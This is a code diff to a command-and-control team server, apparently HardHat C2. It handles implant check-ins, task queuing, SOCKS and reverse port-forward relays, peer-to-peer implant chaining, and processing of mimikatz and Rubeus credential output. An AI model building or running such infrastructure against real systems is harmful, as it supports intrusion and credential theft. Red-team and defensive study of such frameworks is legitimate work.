@@ -20,6 +20,9 @@ using TeamServer.Models.Extras;
 using TeamServer.Controllers;
 using Microsoft.AspNetCore.Http.Headers;
 using System.IO.Compression;
+using Microsoft.CodeAnalysis.CSharp.Syntax;
+using TeamServer.Models.Dbstorage;
+using Serilog;
 
 
 /* used to interact with http managers that are created
@@ -39,6 +42,7 @@ namespace TeamServer.Models
         public static Dictionary<string, List<string>> EngineerChildIds = new Dictionary<string, List<string>>(); //keys are Engineers that have child engineers they can task, value is the childrens ids  
         public static Dictionary<string, List<string>> PathStorage = new Dictionary<string, List<string>>(); // key is the Engineer Id, Value is a list of parent ids and ends with its own id, making its path. The path is a list element 0 is the http, and each new eleemnt is a layer deepr
         public static IEnumerable<EngineerTaskResult> results { get; set;}
+       
 
         public HttpmanagerController(IEngineerService engineers) //uses dependdency Injection to link  to service and crerate object instance. 
         {
@@ -81,11 +85,19 @@ namespace TeamServer.Models
                     ConnectionType = HttpContext.Request.Scheme,
                 };
                 _engineers.AddEngineer(engineer);                    // uses service too add Engineer to list
+                EngineersController.engineerList.Add(engineer);
+                if (DatabaseService.Connection == null)
+                {
+                    DatabaseService.ConnectDb();
+                }
+                DatabaseService.Connection.Insert((Engineer_DAO)engineer);
                 PathStorage.Add(engineer.engineerMetadata.Id, new List<string> { engineer.engineerMetadata.Id });
                 HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {engineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
+                LoggingService.EventLogger.ForContext("engineer Metadata",engineer.engineerMetadata,true).ForContext("connection Type", engineer.ConnectionType).Information($"engineer {engineer.engineerMetadata.ProcessId}@{engineer.engineerMetadata.Address} checked in for the first time");
             }
 
             //checkin and get/post data to or from the engineer 
+            //checkin updates some of the properties for the engineer
             engineer.CheckIn();
             try
             {
@@ -94,7 +106,7 @@ namespace TeamServer.Models
                     //this will happen every sleep cycle it triggers the hub to let the client know a engineer has checked back in  
                     if (HardHatHub._clients.Count() >0)
                     {
-                        await HardHatHub.CheckIn();
+                        await HardHatHub.CheckIn(engineer);
                     }
                     else
                     {
@@ -121,61 +133,75 @@ namespace TeamServer.Models
                         {
                             engIds.Add(result.EngineerId);
                         }
-                        if (CommandIds.ContainsKey(result.Id))
+                        if (result.Status == EngTaskStatus.Running || result.Status == EngTaskStatus.Complete)
                         {
-                            if (CommandIds[result.Id].Command == "download")
+                            if (CommandIds.ContainsKey(result.Id))
                             {
-                               await TaskPostProcess.PostProcess_DownloadTask(result);
-                            }
-                        }
-                        if (result.Id.Equals("ConnectSocksCommand", StringComparison.CurrentCultureIgnoreCase) || result.Id.Equals("socksReceiveData", StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            await TaskPostProcess.PostProcess_SocksTask(result);
-                        }
-                        else if(result.Id.Equals("rportsend",StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            await TaskPostProcess.PostPorcess_RPortForward(result);
-                        }
-                        //performs the first checkin for P2P implants to get the pathing info, metadata, and add the new engineer to the needed lists. 
-                        else if(result.Id.Equals("P2PFirstTimeCheckIn",StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            Console.WriteLine("P2PFirstTimeCheckIn time");
-                            string p2pEngMetadataString = await TaskPostProcess.PostProcess_P2PFirstCheckIn(result,engineer);
-                            byte[] p2pMetaDataByte = Convert.FromBase64String(p2pEngMetadataString);
-                            EngineerMetadata pepEngMetadata = p2pMetaDataByte.ProDeserialize<EngineerMetadata>();
-                            var p2pengineer = _engineers.GetEngineer(pepEngMetadata.Id);
-                            if (p2pengineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
-                            {
-                                // use the parent id to get the parents pid@address 
-                                var parentEngineer = _engineers.GetEngineer(PathStorage[pepEngMetadata.Id][0]);
-                                var extralAddressP2PString = parentEngineer.engineerMetadata.ProcessId + "@" + parentEngineer.engineerMetadata.Address;
-
-                                p2pengineer = new Engineer(pepEngMetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
+                                if (CommandIds[result.Id].Command == "download")
                                 {
-                                    ExternalAddress = extralAddressP2PString,
-                                    ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == pepEngMetadata.ManagerName).Type.ToString(),
-                                };
-                                _engineers.AddEngineer(p2pengineer);                    // uses service too add Engineer to list
-                                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {p2pengineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
+                                    string hostname = _engineers.GetEngineer(result.EngineerId).engineerMetadata.Hostname;
+                                    await TaskPostProcess.PostProcess_DownloadTask(result, hostname);
+                                }
                             }
-                            //checkin and get/post data to or from the engineer 
-                            p2pengineer.CheckIn();
-                        }
-                        //allows for other engineers besides http to have a "check-in"
-                        else if(result.Id.Equals("CheckIn",StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            var eng = _engineers.GetEngineer(result.EngineerId);
-                            eng.CheckIn();
-                        }
-                        //these 2 command types can be processed by the cred check
-                        else if (result.Result.Contains("mimikatz") || result.Result.Contains("rubeus"))
-                        {
-                            await TaskPostProcess.PostProcess_CredTask(result);
+
+                            if (result.Command.Equals("SocksConnect", StringComparison.CurrentCultureIgnoreCase) || result.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
+                            {
+                                await TaskPostProcess.PostProcess_SocksTask(result);
+                            }
+                            else if (result.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase))
+                            {
+                                await TaskPostProcess.PostPorcess_RPortForward(result);
+                            }
+                            //performs the first checkin for P2P implants to get the pathing info, metadata, and add the new engineer to the needed lists. 
+                            else if (result.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
+                            {
+                                Console.WriteLine("P2PFirstTimeCheckIn time");
+                                string p2pEngMetadataString = await TaskPostProcess.PostProcess_P2PFirstCheckIn(result, engineer);
+                                byte[] p2pMetaDataByte = Convert.FromBase64String(p2pEngMetadataString);
+                                EngineerMetadata pepEngMetadata = p2pMetaDataByte.ProDeserialize<EngineerMetadata>();
+                                var p2pengineer = _engineers.GetEngineer(pepEngMetadata.Id);
+                                if (p2pengineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
+                                {
+                                    // use the parent id to get the parents pid@address 
+                                    var parentEngineer = _engineers.GetEngineer(PathStorage[pepEngMetadata.Id][0]);
+                                    var extralAddressP2PString = parentEngineer.engineerMetadata.ProcessId + "@" + parentEngineer.engineerMetadata.Address;
+
+                                    p2pengineer = new Engineer(pepEngMetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
+                                    {
+                                        ExternalAddress = extralAddressP2PString,
+                                        ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == pepEngMetadata.ManagerName).Type.ToString(),
+                                    };
+                                    _engineers.AddEngineer(p2pengineer);                    // uses service too add Engineer to list
+                                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {p2pengineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
+                                    LoggingService.EventLogger.Information("P2P engineer {@p2pengineer} checked in for the first time", p2pengineer);
+                                }
+                                //checkin and get/post data to or from the engineer 
+                                p2pengineer.CheckIn();
+                            }
+                            //allows for other engineers besides http to have a "check-in"
+                            else if (result.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
+                            {
+                                var eng = _engineers.GetEngineer(result.EngineerId);
+                                eng.CheckIn();
+                            }
+                            //these 2 command types can be processed by the cred check
+                            else if (result.Result.Contains("mimikatz") || result.Result.Contains("rubeus"))
+                            {
+                                await TaskPostProcess.PostProcess_CredTask(result);
+                            }
                         }
                         if (result.IsHidden)
                         {
                             results = results.Where(x => x.Id != result.Id);
-                        }                    
+                        }
+                        if (DatabaseService.Connection == null)
+                        {
+                            DatabaseService.ConnectDb();
+                        }
+                        if(result.IsHidden == false)
+                        {
+                            DatabaseService.Connection.Insert((EngineerTaskResult_DAO)result);
+                        }
                     }
                     foreach(string engId in engIds)
                     {
@@ -184,7 +210,7 @@ namespace TeamServer.Models
                         // make another hub connection so I can invoke the GetTaskResults method on the client side
                         if (HardHatHub._clients.Count > 0)
                         {
-                            await HardHatHub.CheckIn();
+                            await HardHatHub.CheckIn(TaskedEng);
                             //get a list of the taskIds for this engineer
                             var tasksList = TaskedEng.GetTaskResults();
                             var taskIds = tasksList.Select(t => t.Id).ToList();
@@ -214,7 +240,11 @@ namespace TeamServer.Models
                 List<Engineer> TaskingEngs = new List<Engineer>();
                 foreach(Engineer eng in _engineers.GetEngineers())
                 {
-                   if(PathStorage[eng.engineerMetadata.Id].Contains(engineer.engineerMetadata.Id)) // checking if the current Http implant is in its path, if it is then we know eng is a child of this http implant in some way and can be tasked by it.
+                    if (!PathStorage.ContainsKey(eng.engineerMetadata.Id))
+                    {
+                        PathStorage.Add(eng.engineerMetadata.Id, new List<string>() { eng.engineerMetadata.Id });
+                    }
+                    if (PathStorage[eng.engineerMetadata.Id].Contains(engineer.engineerMetadata.Id)) // checking if the current Http implant is in its path, if it is then we know eng is a child of this http implant in some way and can be tasked by it.
                     {
                         if(eng._pendingTasks.Count() >0) // eng has a task to be sent
                         {
@@ -233,12 +263,13 @@ namespace TeamServer.Models
                                     {
                                         await TaskPreProcess.PreProcessTask(task, eng);
                                     }
+                                    HardHatHub.AddTaskIdToPickedUpList(task.Id);
                                 }
                                 var taskArray = engTasks.ProSerialise();
                                 var encryptedTaskArray = Encryption.AES_Encrypt(taskArray,"PlaceTaskKeyHereLater");
                                 var c2TaskMessage = new C2TaskMessage { TaskData = encryptedTaskArray, PathMessage = PathStorage[eng.engineerMetadata.Id] };
                                 //do a console.WriteLine where the message each element in c2TaskMessage.PathMessage
-                                Console.WriteLine($"path is {String.Join("->",c2TaskMessage.PathMessage)}");
+                                //Console.WriteLine($"path is {String.Join("->",c2TaskMessage.PathMessage)}");
                                 c2TaskMessageArray.Add(c2TaskMessage);
                             }
                         }
@@ -249,61 +280,6 @@ namespace TeamServer.Models
 
                 if(TaskingEngs.Count() > 0)
                 { 
-               // tasks = engineer.GetPendingTasks(); //need to swap out so im getting tasks for every engineer
-
-                //List<EngineerTask> taskList = new List<EngineerTask>();
-                //foreach (var task in tasks)
-                //{
-                //    taskList.Add(task);
-                //    //add the taskId to the Command dictionary so we can match the task id to the command id when we get the response from the engineer
-                //    if (!CommandIds.ContainsKey(task.Id))
-                //    {
-                //        CommandIds.Add(task.Id, task);
-                //    }
-                //    if (TaskPreProcess.CommandsThatNeedPreProc.Contains(task.Command))
-                //    {
-                //        await TaskPreProcess.PreProcessTask(task, engineer);
-                //    }
-                //}
-
-                //if (tasks.Count() > 0)
-                //{
-                    //// get the data ready for transport, seralise and encrypt it.
-                    //var taskArray = tasks.ProSerialise();
-                    //var encryptedTaskArray = Encryption.AES_Encrypt(taskArray);
-
-                    ////look at the EngineerChildIds Dictionary, search for the current Engineers Id as a value if it is found add it to a string & prepend its key to that string. Then look for that key as a dictionary value, if it is found prepend its key to the front and repeat until no more values are found
-                    //string pathing = "";
-                    //string parent = "";
-                    //foreach (var Ids in EngineerChildIds)
-                    //{
-                    //    if(Ids.Value.Contains(engineer.engineerMetadata.Id))
-                    //    {
-                    //        pathing = engineer.engineerMetadata.Id;
-                    //        pathing = pathing.Insert(0, Ids.Key);
-                    //        parent = Ids.Key;
-                    //        for( int i=0; i<EngineerChildIds.Count(); i++)
-                    //        {
-                    //            if (EngineerChildIds.ElementAt(i).Value.Contains(parent))
-                    //            {
-                    //                pathing = pathing.Insert(0, EngineerChildIds.ElementAt(i).Key);
-                    //                parent = EngineerChildIds.ElementAt(i).Key;
-                    //                i = -1; //gets set back to 0 by the i++ line
-                    //            }
-                    //        }
-                    //    }
-                    //}
-                    //Console.WriteLine($"pathing is {pathing}");
-
-
-
-                    //make a C3TaskMessage with the encryptedTaskArray and the engineer id
-                    //var c2TaskMessageJustData = new C2TaskMessage { TaskData = encryptedTaskArray };
-                    //var c2TaskMessageArrayJustData = c2TaskMessageJustData.ProSerialise();
-                    //var encrypedc2message = Encryption.AES_Encrypt(c2TaskMessageArrayJustData);
-
-                    
-                    //Console.WriteLine($"Sending {encrypedc2message.Length} bytes");
                     return File(encrypedc2messageArray, "application/octet-stream"); // This is what gets send back on the eng check in and if its not null we sent a task object.
                 }
                 else if (TaskingEngs.Count() == 0)
@@ -338,7 +314,7 @@ namespace TeamServer.Models
                 var decryptedImplantIdByte = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedImplantId), Encryption.UniversialMetadataIdKey);
                 //undo the utf-8 encoding to get back the string 
                 var decryptedImplantId = Encoding.UTF8.GetString(decryptedImplantIdByte);
-                Console.WriteLine($"implant id is {decryptedImplantId}");
+               // Console.WriteLine($"implant id is {decryptedImplantId}");
 
                 if (!headers.TryGetValue("Authorization", out var encryptedencodedMetadata))     //extracted as base64 due too TryGetValue
                 {
